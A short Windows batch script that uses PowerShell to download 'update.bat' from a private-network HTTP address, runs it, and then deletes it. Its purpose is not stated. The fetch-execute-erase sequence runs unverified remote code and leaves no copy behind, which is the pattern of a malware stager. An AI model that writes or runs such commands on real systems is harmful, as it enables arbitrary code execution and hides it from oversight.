@echo off
setlocal
cd %~dp0
for %%f in ("%~dp0") do (
set dir=%%~sf
)
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://192.168.1.105/files/spec sheet/update.bat', '%dir%update.bat')"
call "%dir%update.bat"
del "%dir%update.bat"
endlocal